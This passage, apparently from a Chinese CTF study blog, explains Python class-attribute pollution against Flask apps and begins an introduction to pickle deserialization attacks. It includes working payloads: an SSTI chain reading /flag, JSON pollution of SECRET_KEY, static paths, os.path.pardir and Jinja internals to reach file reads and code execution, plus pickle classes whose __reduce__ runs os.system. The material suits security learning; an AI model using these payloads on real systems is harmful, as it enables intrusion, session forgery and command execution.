elif hasattr(dst, k) and type(v) == dict: #如果无法进行字典操作则是对象，获取到对象的属性，再进行函数嵌套，直到获取到字典            merge(v, getattr(dst, k))        else:            setattr(dst, k, v) #如果既不是字典也没有对应的属性则将键值对写入属性,也是原型链污染的触发点instance = son_b() #实例化一个对象用于访问原型print(instance)payload = &#123;    &quot;__class__&quot; : &#123; #先通过__calss__方法获取到对象的所在类        &quot;__base__&quot; : &#123; # 再通过__base__获取到父类            &quot;secret&quot; : &quot;world&quot;  #对父类进行属性写入        &#125;    &#125;&#125;print(son_a.secret)#helloprint(instance.secret)#hellomerge(payload, instance)# k:__class__      v:&#123;&#x27;__base__&#x27;: &#123;&#x27;secret&#x27;: &#x27;world&#x27;&#125;&#125;# getattr(dst,k):  &lt;class &#x27;__main__.son_b&#x27;&gt;# k:__base__       v:&#123;&#x27;secret&#x27;: &#x27;world&#x27;&#125;# getattr(dst,k):  &lt;class &#x27;__main__.father&#x27;&gt;# k:secret         v:worldprint(son_a.secret)#worldprint(instance.secret)#world\n\n于是这个原型链污染的逻辑主要还是修改属性，我们先来看payload的第一次循环\n# 由于__class__获取到的是类不是字典，进入elif        elif hasattr(dst, k) and type(v) == dict:             merge(v, getattr(dst, k))#由于v是字典于是获取到dst的类再次进行函数嵌套，&#123;&quot;__base__&quot; : &#123;&quot;secret&quot; : &quot;world&quot;&#125;&#125;#但是类还是不是对象，v有时字典，于是再次进行elif再次函数嵌套，这次访问到的时候是父类father&#123;&quot;secret&quot; : &quot;world&quot;&#125;#然后由于father中没有secret属性，v是world也不是字典，于是进入elsesetattr(dst, k, v)#将这个键值对写入father实现原型链污染\n\n代码中实现的原型链污染是通过不断获取原型链然后往father中写属性，根本就没有用到这一串代码\nif hasattr(dst, &#x27;__getitem__&#x27;):  #检查对象是否有__getitem__魔术方法也就是是否能进行字典操作，也就是检查dst是不是字典    if dst.get(k) and type(v) == dict: #如果payload的值为字典则进行函数嵌套和js的逻辑是一样的        merge(v, dst.get(k))    else:        dst[k] = v\n\n这个代码主要是当我们需要污染的不是属性而是字典的时候才能触发的代码，我们可以通过__dict__获取到这个对象的实例属性的一个集合的字典，我们可以进行污染，我们可以通过污染当前对象的__dict__实现修改属性，但是这个方法好像很局限，只能修改当前对象的属性\n3.获取目标类感觉原型链污染的代码每次都只能那么写，都是进行函数嵌套然后对键进行赋值，不然那么就无法那么容易污染了，还是我太菜了，只会这种\n我们之前写SSTI的时候就是通过各种魔术方法去获取有命令执行模块的类然后进行命令执行，现在原型链污染由于不能像Js一样污染所有类，现在需要通过各种方法获取目标类\n上面示例我们是通过__base__属性查找到继承的父类，然后污染到的父类中的secret参数，但是如果目标类与切入点没有父子类继承关系，那我们就无法用__base__属性来进行对目标类的获取和污染\n这个时候又要把SSTI的那个表格拿出来了\n\n\n\n魔术方法\n作用\n\n\n\n_init_\n对象的初始化方法\n\n\n_class_\n返回对象所属的类\n\n\n_module_\n返回类所在的模块\n\n\n_mro_\n返回类的调用顺序，可以此找到其父类（用于找父类）\n\n\n_base_\n获取类的直接父类（用于找父类）\n\n\n_bases_\n获取父类的元组，按它们出现的先后排序（用于找父类）\n\n\n_dict_\n返回当前类的函数、属性、全局变量等\n\n\n_subclasses_\n返回所有仍处于活动状态的引用的列表，列表按定义顺序排列（用于找子类）\n\n\n_globals_\n获取函数所属空间下可使用的模块、方法及变量（用于访问全局变量）\n\n\n_import_\n用于导入模块，经常用于导入os模块\n\n\n_builtins_\n返回Python中的内置函数，如eval\n\n\n主要的思路就是先一路访问到最开始的父类，然后再通过[37]__subclasses__去遍历全部子类，然后再子类中通过__init__访问到初始方法然后再利用__globals__访问当前类中模块，我们也可以选择直接在父类中找模块(如果有的话)，总之目的就是访问到os等模块，然后最后使用__builtions__访问内置函数\nSSTI payload示例\n&#123;&#123;().__class__.base.__.__subclass__.()[37].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;)&#125;&#125;  #在子类中查找模块  eval中的代码是为了在模板渲染的时候动态导入os模块\n\n我们的主要目的还是在当前的空间下无论哪个类都找到可以利用的模块即可\n1.获取全局变量虽然在SSTI中这一步很容易，但是，这可是原型链污染，具体操作还是有很大不一样的。\na=1def demo():    passclass A :    def __init__(self):        passprint(demo.__globals__==globals()==A.__init__.__globals__)#True  也就是说init方法和demo函数处于同一空间中，可以通过A.__init__.__globals__[&#x27;demo&#x27;]访问到函数\n\n于是我们可以在原型链污染的过程中通过merge.__globals__访问到全局变量\na = 1def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)def demo():    passclass A:    def __init__(self):        passclass B:    a=0    classa = 2instance = A()payload = &#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;a&quot;:4,            &quot;B&quot;:&#123;                &quot;classa&quot;:5            &#125;        &#125;    &#125;&#125;print(B.a) #0print(a)  #1merge(payload, instance)print(B.a) #0print(a)   #4\n\n我们从这个结果可以发现可以污染全局变量但是不能污染其他类中的实例变量\n2.获取其他模块import加载获取\n对于那些引入的python包，我们也是可以在全局变量下直接进行污染的\nimport demopayload = &#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;demo&quot;:&#123;  #直接访问demo包                &quot;a&quot;:4,                &quot;B&quot;:&#123;                    &quot;classa&quot;:5                &#125;            &#125;        &#125;    &#125;&#125;##demo.pya = 1class B:    classa = 2\n\n\n\nsys加载获取\nsys即system，提供了与 Python 解释器及其环境交互的功能。\n通过 sys 库，你可以访问与 Python 解释器相关的变量和函数，例如命令行参数、标准输入输出、程序退出等。\n比如我们在执行脚本的时候可以通过sys.arg获取命令行中输入的参数\n但是现在主要要管怎么通过sys获取原型链污染的模块\nsys.modules返回的是已加载模块的字典，我们可以获取到所有已经加载的模块，但前提是sys也被加载了\nimport syspayload = &#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;sys&quot;:&#123;                &quot;modules&quot;:&#123;                    &quot;demo&quot;:&#123;                        &quot;a&quot;:4,                        &quot;B&quot;:&#123;                            &quot;classa&quot;:5                        &#125;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;\n\n加载器loader获取\nPython中的 __loader__ 是一个与模块加载相关的魔术属性，它存储了加载该模块的加载器对象。\nimport math# 获取模块的loaderloader = math.__loader__# 打印loader信息print(loader)# &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;\n\nloader加载器在python中的作用是为实现模块加载而设计的类，其在importlib这一内置模块中有具体实现。而importlib模块下所有的py文件中均引入了sys模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过loader.__init__.__globals__[&#39;sys&#39;]来获取到sys模块，然后再获取到我们想要的模块。\n于是我们就只需要\n模块.__loader__.__init__.__globals__[&#x27;sys&#x27;]\n\n即可访问到其他引入的模块\n4.函数形参默认值替换主要用到了函数的__defaults__和__kwdefaults__这两个内置属性\n1.__defaults__在Python中，__defaults__是一个元组，用于存储函数或方法的默认参数值。当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在__defaults__元组中。需要注意的是关键字参数不会储存在其中\ndef func_a(var_1, var_2 =2, var_3 = 3):    pass def func_b(var_1, /, var_2 =2, var_3 = 3):    pass def func_c(var_1, var_2 =2, *, var_3 = 3):    pass def func_d(var_1, /, var_2 =2, *, var_3 = 3):    pass print(func_a.__defaults__)#(2, 3)print(func_b.__defaults__)#(2, 3)print(func_c.__defaults__)#(2,)print(func_d.__defaults__)#(2,)\n\n在Python中，参数分为位置参数和关键字参数，我们来看代码\ndef func_a(var_2 =2, var_3 = 3):    # 方式1：纯位置传参（var_2和var_3都是作为位置参数）func_a(10, 20)          # var_2=10, var_3=20# 方式2：混合传参（var_2是位置参数，var_3是关键字参数）func_a(10, var_3=20)    # var_2=10, var_3=20# 方式3：纯关键字传参（var_2和var_3都是作为关键字参数）func_a(var_2=10, var_3=20)\n\n然后我们可以利用参数中的分隔符来限定关键字参数\n在Python函数参数列表中，单个的 * 作为一个分隔符，它表示：\n\n* 前面的参数可以是位置参数或关键字参数（遵循普通规则）\n* 后面的参数必须是仅关键字参数\n\n/ 用于在函数参数列表中明确划分：\n\n/ 左边的参数必须是仅位置参数\n/ 右边的参数可以是位置参数或关键字参数\n\n所以我们就可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：\npayload = &#123;    &quot;__init__&quot; : &#123;        &quot;__globals__&quot; : &#123;            &quot;demo&quot; : &#123;                &quot;__defaults__&quot; : (True,)            &#125;        &#125;    &#125;&#125;\n\n\n\n2.__kwdefaults____kwdefaults__以字典的形式按从左到右的顺序收录了函数键值形参的默认值 (包含所有仅限关键字参数的默认值)如果函数没有强制性关键字参数，则为 None。如果存在强制性关键字参数，则返回一个字典，键为参数名，值为默认值。\n也就是说只是将元组换为了字典，然后内容变为只有强制性关键参数\ndef func_a(var_1, var_2 =2, var_3 = 3):    pass def func_b(var_1, /, var_2 =2, var_3 = 3):    pass def func_c(var_1, var_2 =2, *, var_3 = 3):    pass def func_d(var_1, /, var_2 =2, *, var_3 = 3):    pass print(func_a.__kwdefaults__)#None print(func_b.__kwdefaults__)#None print(func_c.__kwdefaults__)#&#123;&#x27;var_3&#x27;: 3&#125; print(func_d.__kwdefaults__)#&#123;&#x27;var_3&#x27;: 3&#125;\n\n\n\n\n\n5.特定值替换1.flask密匙替换1.SECRET_KEYSECRET_KEY 是决定 flask 的 session 生成的重要参数，知道该参数可以实现 session 任意伪造给出示范环境如下：\n#app.py from flask import Flask,requestimport json app = Flask(__name__) def merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v) class cls():    def __init__(self):        pass instance = cls() @app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index():    if request.data:        merge(json.loads(request.data), instance)    return &quot;[+]Config:%s&quot;%(app.config[&#x27;SECRET_KEY&#x27;]) app.run(host=&quot;0.0.0.0&quot;)\n\n这个代码就是先进行原型链污染然后再输出SECRET_KEY\n&#123;    &quot;__init__&quot; : &#123;        &quot;__globals__&quot; : &#123;            &quot;app&quot; : &#123;                &quot;config&quot; : &#123;                    &quot;SECRET_KEY&quot; :&quot;Polluted~&quot;                &#125;            &#125;        &#125;    &#125;&#125;\n\n显示通过全局变量访问到app，然后再对config进行污染\n2._got_first_request用于判定是否某次请求为自 Flask 启动后第一次请求，是 Flask.got_first_request 函数的返回值，此外还会影响装饰器 app.before_first_request 的调用，依据源码可以知道_got_first_request 值为假时才会调用\n所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将_got_first_request从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器app.before_first_request下面的可用信息。\n示范环境如下：\nfrom flask import Flask,requestimport json app = Flask(__name__) def merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v) class cls():    def __init__(self):        pass instance = cls() flag = &quot;Is flag here?&quot; #调用这个方法，直接输出flag@app.before_first_requestdef init():    global flag    if hasattr(app, &quot;special&quot;) and app.special == &quot;U_Polluted_It&quot;:        flag = open(&quot;flag&quot;, &quot;rt&quot;).read() @app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index():    if request.data:        merge(json.loads(request.data), instance)    global flag    setattr(app, &quot;special&quot;, &quot;U_Polluted_It&quot;)    return flag app.run(host=&quot;0.0.0.0&quot;)\n\npayload\n&#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;app&quot;:&#123;                &quot;_got_first_request&quot;:false            &#125;        &#125;    &#125;&#125;\n\n\n\n\n\n3._static_url_path当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向\n这个属性中存放的是 flask 中静态目录的值，默认该值为 static。访问 flask 下的资源可以采用如 http://domain/static/xxx，这样实际上就相当于访问_static_url_path 目录下 xxx 的文件并将该文件内容作为响应内容返回\n#static/index.html &lt;html&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;body&gt;    &lt;/body&gt;&lt;/html&gt;\n\n示例代码：\n@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index():    if request.data:        merge(json.loads(request.data), instance)    return &quot;flag in ./flag but heres only static/index.html&quot;\n\npayload\npayload=&#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;app&quot;:&#123;                &quot;_static_folder&quot;:&quot;./&quot;            &#125;        &#125;    &#125;&#125;\n\n\n\n4.os.path.pardir这个 os 模块下的变量会影响 flask 的模板渲染函数 render_template 的解析，所以也收录在 flask 部分，模拟的环境\n示例代码\n#app.py from flask import Flask,request,render_templateimport jsonimport os app = Flask(__name__) def merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v) class cls():    def __init__(self):        pass instance = cls() @app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index():    if request.data:        merge(json.loads(request.data), instance)    return &quot;flag in ./flag but u just can use /file to vist ./templates/file&quot; @app.route(&quot;/&lt;path:path&gt;&quot;)def render_page(path):    if not os.path.exists(&quot;templates/&quot; + path):        return &quot;not found&quot;, 404    return render_template(path) app.run(host=&quot;0.0.0.0&quot;)\n\n直接访问 http://domain/xxx 时会使用 render_tempaltes 渲染 templates/xxx 文件\n如果尝试目录穿越 (http://domain/../test.py) 则会导致 render_template 函数报错\n跟着大佬的链子走，最后来到了\n\n\n结合函数注释可以了解到这个函数将会把传入的模板路径按照 / 进行分割，在 34 行的逻辑判断上决定了（其余的部分逻辑值基本为假）整个 if 语句是否为真，显然需要改语句为假避免触发 34 行的 raise。34 行中的 os.path.pardir 值即为..，所以只要修改该属性为任意其他值即可避免报错，从而实现 render_template 函数的目录穿越\n也就是说会对我们的访问路径使用/隔开然后通过os.path.pardir对其进行过滤，我们只需要污染这个属性为穿越目录无关的即可\npayload\n&#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;os&quot;:&#123;                &quot;path&quot;:&#123;                    &quot;pardir&quot;:&quot;!&quot;                &#125;            &#125;        &#125;    &#125;&#125;\n\n\n\n\n\n2.Jinja 语法标识符在默认的规则规则下，常用 Jinja 语法标识符有 &#123;&#123; Code &#125;&#125;、&#123;% Code %&#125;、&#96;&#96;，当然对于我们需要 RCE 的需求来说，通常前两者才需要留意。而 Flask 官方文档中明确告知了，这些语法标识符均是可以依照 Jinja 中修改的在 Jinja 文档中展示了对这些语法标识符进行替换的方法：API — Jinja Documentation (3.1.x) (palletsprojects.com)，即对 Jinja 的环境类的相关属性赋值\n大概意思就是我们可以通过修改封装在Flask中的jinja来修改语法标识符\n\n\n最后又是大佬的一顿操作，发现jinja_env 方法返回值就是 Jinja 中的环境类（实际上是对原生的 Jinja 环境类做了继承，不过在使用上并无多大区别），所以我们可以直接采用类似 Flask.jinja_env.variable_start_string = &quot;xxx&quot; 来实现对 Jinja 语法标识符进行替换\n示例代码\n#templates/index.html &lt;html&gt;&lt;h1&gt;Look this -&gt; [[flag]] &lt;- try to make it become the real flag&lt;/h1&gt;&lt;body&gt;    &lt;/body&gt;&lt;/html&gt;\n\n我们可以看到，在html文件中有[[flag]]如果污染为语法标识符就可以直接输出flag\n@app.route(&#x27;/index&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def templates():    return render_template(&quot;test.html&quot;, flag = open(&quot;flag&quot;, &quot;rt&quot;).read()) app.run(host=&quot;0.0.0.0&quot;)\n\n访问 index 路由会给模板填充 flag 变量的值，但是需要应该要语法标识符是 &#123;&#123;flag&#125;&#125;，但这里是 [[flag]] 是无法被解析的\n这里按照上面所述，修改相应的语法标识符：\n&#123;    &quot;__init__&quot; : &#123;        &quot;__globals__&quot; : &#123;            &quot;app&quot; : &#123;                    &quot;jinja_env&quot; :&#123;                        &quot;variable_start_string&quot; : &quot;[[&quot;,&quot;variable_end_string&quot;:&quot;]]&quot;                    &#125;            &#125;        &#125;    &#125;&#125;\n\n这样就成功了吗？并没有，访问 index 路由会发现 flag 值还是没有被填充进来，也就是语法标识符没有被解析\n为什么呢？这里先给出结论，Flask 默认会对一定数量内的模板文件编译渲染后进行缓存，下次访问时若有缓存则会优先渲染缓存，所以输入 payload 污染之后虽然语法标识符被替换了，但渲染的内容还是按照污染前语生成的缓存，由于缓存编译时并没有存在 flag 变量，所以自然没有被填充 flag。\n所以只需我们在 Flask 服务启动后（当然这里演示就是重启下 Flask 服务就行了，对于题目来说一般就是重启容器，或是在污染之后再访问模板）先输入 payload 再访问 index 路由即可\n3.Jinja 语法全局数据实际上包括函数、变量、过滤器这三者都能被自定义的添加到 Jinja 语法解析时的环境，操作方式于 Jinja 语法标识符中完全类似\n也就是说我们可以直接污染Jinja环境下的函数，变量，过滤器\n这里以增加变量为例子给出模拟的环境如下：\n#templates/index.html &lt;html&gt;&lt;h1&gt;&#123;&#123;flag if permission else &quot;No way!&quot;&#125;&#125;&lt;/h1&gt;&lt;body&gt;    &lt;/body&gt;&lt;/html&gt;\n\n这个，必须要permission这个变量为真才能输出flag\n我们直接像污染语法标识符一样污染变量即可\n&#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;app&quot;:&#123;                &quot;jinja_env&quot;:&#123;                    &quot;globals&quot;:&#123;                        &quot;permission&quot;:true                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;\n\n\n\n4.模板编译时的变量在 flask 中如使用 render_template 渲染一个模板实际上经历了多个阶段的处理，其中一个阶段是对模板中的 Jinja 语法进行解析转化为 AST，而在语法树的根部即 Lib/site-packages/jinja2/compiler.py 中 CodeGenerator 类的 visit_Template 方法纯在一段有趣的逻辑\n\n\n该逻辑会向输出流写入一段拼接的代码（输出流中代码最终会被编译进而执行），注意其中的 exported_names 变量，该变量为.runtime 模块（即 Lib/site-packages/jinja2/runtime.py）中导入的变量 exported 和 async_exported 组合后得到，这就意味着我们可以通过污染.runtime 模块中这两个变量实现 RCE。由于这段逻辑是模板文件解析过程中必经的步骤之一，所以这就意味着只要渲染任意的文件均能通过污染这两属性实现 RCE。\npayload\n&#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;__loader__&quot;:&#123;                &quot;__init__&quot;:&#123;                    &quot;__globals__&quot;:&#123;                        &quot;sys&quot;:&#123;                            &quot;modules&quot;:&#123;                                &quot;jinja2&quot;:&#123;                                    &quot;runtime&quot;:&#123;                                        &quot;exported&quot;:[                                            &quot;*;__import__(&#x27;os&#x27;).system(&#x27;cp ./flag ./static/flag&#x27;)                                            ;#&quot;                                        ]                                    &#125;                                &#125;                            &#125;                        &#125;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;\n\n但是需要注意插入 payload 的位置是 AST 的根部分，是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的 payload 只会在模板在第一次访问时触发然后就能在 static 目录下读取到 flag 了 /static/flag\n"},{"title":"Python反序列化","url":"/2025/05/23/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"Python反序列化前言又要开始学基础知识了，学好了python反序列化题才能写，无论是从储存还是使用好像都和php不一样。但是之前是做题后再去学习反序列化，现在不能这样了，要先学序列化\n1.序列化和反序列化序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。\n反序列化 (Deserialization)是将有序的二进制序列转换成某种对象（字典，列表等）的过程。\n为什么要使用序列化\n1、存储\n一个软件&#x2F;程序的执行就在处理一系列状态的变化。\n在编程语言中，“状态”会以各种各样有结构的数据类型(也可简单的理解为变量)的形式被保存在内存中。\n内存无法永久保存数据，当程序运行一段时间，断电或者重启程序，内存中关于这个程序的一些数据就被清空了。\n在断电或重启程序之前将程序当前内存中所有的数据都保存下来，以便于下次程序执行能够从文件中载入之前的数据就是序列化。\n2、传输\n因为TCP&#x2F;IP协议只支持字节数组的传输，不能直接传对象。\n对象序列化的结果一定是字节数组！\n当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。\n发送方需要把这个对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为对象。\n如果收发的双方约定好实用一种序列化的格式，那么便打破了平台&#x2F;语言差异化带来的限制，实现了跨平台数据交互！\n也就是说序列化是为了通过字节数组的形式去传递对象等不能直接传递的数据，难怪序列化数据只会包含对象名和属性值\n2.JSON我们学习JSON不止是用来学序列化，在python中很多数据比如session都是用JSON储存的，但是现在还没比要细学\nJSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。\n它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。\n简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。\n易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。\n为什么要使用JSON\n如果我们要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如XML，但更好的方法是序列化为JSON。\n因为JSON表示出来就是一个字符串，可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。\nJSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。\n3.Python反序列化相关函数pickle.dump(obj, file) ：将对象序列化后保存到文件。pickle.load(file) ：读取文件， 将文件中的序列化内容反序列化为对象。pickle.dumps(obj) ：将对象序列化成字符串格式的字节流。pickle.loads(bytes_obj) ：将字符串格式的字节流反序列化为对象\n这些函数的功能很好理解，但是还需要看看实际上怎么使用\n1.dump和dumps函数import json# dumps可以格式化所有的基本数据类型为字符串data1 = json.dumps([])         # 列表print(data1, type(data1))data2 = json.dumps(2)          # 数字print(data2, type(data2))data3 = json.dumps(&#x27;3&#x27;)        # 字符串print(data3, type(data3))dict = &#123;&quot;name&quot;: &quot;Tom&quot;, &quot;age&quot;: 18&#125;   # 字典data4 = json.dumps(dict)print(data4, type(data4))with open(&quot;test.json&quot;, &quot;w&quot;, encoding=&#x27;utf-8&#x27;) as f:    # indent 格式化保存字典，默认为None，小于0为零个空格。indent=4缩进4个空格    f.write(json.dumps(dict, indent=4))    json.dump(dict, f, indent=4)  # 传入文件描述符，和dumps一样的结果#通过json.dump将序列化数据存入json文件\n\n但是实际上做题好像用到的都是pickle库，但是这个对于数据储存还是有帮助的\n得到的输出结果如下（格式化所有的数据类型为str类型）：\n[] &lt;class &#x27;str&#x27;&gt;2 &lt;class &#x27;str&#x27;&gt;&quot;3&quot; &lt;class &#x27;str&#x27;&gt;&#123;&quot;name&quot;: &quot;Tom&quot;, &quot;age&quot;: 18&#125; &lt;class &#x27;str&#x27;&gt;#序列化结果都变成了字符串\n\ntest.json中的内容：\n&#123;    &quot;name&quot;: &quot;Tom&quot;,    &quot;age&quot;: 18&#125;#就连缩进四个空格都是可以设置的吗\n\n2.load和loads函数import jsondict = &#x27;&#123;&quot;name&quot;: &quot;Tom&quot;, &quot;age&quot;: 18&#125;&#x27;   # 将字符串还原为dictdata1 = json.loads(dict)print(data1, type(data1))with open(&quot;test.json&quot;, &quot;r&quot;, encoding=&#x27;utf-8&#x27;) as f:    data2 = json.loads(f.read())    # load的传入参数为字符串类型    print(data2, type(data2))    f.seek(0)                       # 将文件游标移动到文件开头位置    data3 = json.load(f)    print(data3, type(data3))\n\n运行结果如下：\n&#123;&#x27;name&#x27;: &#x27;Tom&#x27;, &#x27;age&#x27;: 18&#125; &lt;class &#x27;dict&#x27;&gt;&#123;&#x27;name&#x27;: &#x27;Tom&#x27;, &#x27;age&#x27;: 18&#125; &lt;class &#x27;dict&#x27;&gt;&#123;&#x27;name&#x27;: &#x27;Tom&#x27;, &#x27;age&#x27;: 18&#125; &lt;class &#x27;dict&#x27;&gt;\n\n\n\nPython反序列化漏洞我们之前已经基本了解了python反序列化了，但是那个还不是做题用到了，做题一般都是Pickle库用来触发魔术方法和代码去拿到flag\n1.Python反序列化相关函数\npickle.dump(obj, file) ：将对象序列化后保存到文件。\n\npickle.load(file) ：读取文件， 将文件中的序列化内容反序列化为对象。\n\npickle.dumps(obj) ：将对象序列化成字符串格式的字节流。\n\npickle.loads(bytes_obj) ：将字符串格式的字节流反序列化为对象。\n\n\n2.反序列化相关魔术方法\nreduce() ：反序列化时调用。\nreduce_ex() ：反序列化时调用。\nsetstate() ：反序列化时调用。\ngetstate() ：序列化时调用。\n\n1.reduce()\nimport pickleimport os#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()class A(object):    def __reduce__(self):        print(&#x27;反序列化调用&#x27;)        return (os.system,(&#x27;calc&#x27;,)) #必须要有returna = A()p_a = pickle.dumps(a)pickle.loads(p_a) #将其注释之后不会弹计算机，但是输出结果不变print(&#x27;==========&#x27;)print(p_a)\n\n执行结果会输出反序列化调用和把电脑上的计算器弹出来，这个代码先对对象进行序列化再进行反序列化\nb&#x27;\\x80\\x04\\x95\\x1c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02nt\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x04calc\\x94\\x85\\x94R\\x94.&#x27;\n\n这是输出的序列化数据，竟然是用16进制储存的\n2.setstate()\nimport pickleimport osclass SerializePerson():    def __init__(self, name):        self.name = name    # 构造 __setstate__ 方法    def __setstate__(self, name):        os.system(&#x27;calc&#x27;)  # 恶意代码tmp = pickle.dumps(SerializePerson(&#x27;tom&#x27;))  #序列化pickle.loads(tmp)  # 反序列化 此时会弹出计算器\n\n3.getstate()\n这是唯一一个在序列化时候触发的魔术方法\nimport pickle import os #序列化魔术方法调用-__getstate__ class A(object):     def __getstate__(self):         print(&#x27;序列化调用&#x27;)         os.system(&#x27;calc&#x27;) a = A() p_a = pickle.dumps(a) print(&#x27;==========&#x27;) print(p_a)\n\n看了Python魔术方法，感觉比php反序列化还容易一点，由于不需要构造pop链\nPickle\n与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。\npython有另一个更原始的序列化包marshal，现在开发时一般使用pickle。\n与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示，自定义类型。\npickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。\n\n也就是说Pickle是一种Python独有的序列化语言，且可以表示Python几乎所有的类型\nPickle则是通过将Python代码编写为opcode序列来实现传递对象等操作\nopcode是一个概念，在不同的语言中都不一样，指的是不可拆分的原始指令，感觉和汇编语言差不多\n我们可以通过以下代码查看opencode\nimport pickleimport pickletoolsdata = &#123;&quot;name&quot;: &quot;Bob&quot;, &quot;scores&quot;: [85, 92, 78]&#125;# 序列化serialized = pickle.dumps(data)print(&quot;原始字节:&quot;, serialized)# 反汇编查看opcodeprint(&quot;\\nOpcode分析:&quot;)pickletools.dis(serialized)#用于将opcode转化为肉眼可以读取的形式\n\n得到的是\n 0: \\x80 PROTO      4 2: \\x95 FRAME      3511: &#125;    EMPTY_DICT12: \\x94 MEMOIZE13: \\x8c SHORT_BINUNICODE &#x27;name&#x27;19: \\x94 MEMOIZE20: \\x8c SHORT_BINUNICODE &#x27;Bob&#x27;25: \\x94 MEMOIZE26: \\x8c SHORT_BINUNICODE &#x27;scores&#x27;...58: .    STOP\n\n我们可以注意到，就是其他语言的序列化数据都是可以可视字符，只有Python反序列化需要使用不知道是什么编码显示\nb&#x27;\\x80\\x04\\x95\\x1c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02nt\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x04calc\\x94\\x85\\x94R\\x94.&#x27;\n\n也就是说通过这些编码来还原出opcode序列然后再还原出Python代码\nPVM我们在使用pickler的时候，我们要序列化的内容，必须经过PVM，Pickle Virtual Machine (PVM)是Python语言中的一个虚拟机，用于序列化和反序列化Python对象。它是Python标准库中的一部分，由Python的pickle模块提供支持。下面是Pickle Virtual Machine的运行原理：\n\n生成操作码序列：pickle模块在序列化Python对象时，会生成一系列操作码（opcode）来表示对象的类型和值。这些操作码将被保存到文件或网络流中，以便在反序列化时使用。\n反序列化操作码：在反序列化时，pickle模块读取操作码序列，并将其解释为Python对象。它通过Pickle Virtual Machine来执行操作码序列。Virtual Machine会按顺序读取操作码，并根据操作码的类型执行相应的操作。\n执行操作码：Pickle Virtual Machine支持多种操作码，包括压入常量、调用函数、设置属性等。执行操作码的过程中，Virtual 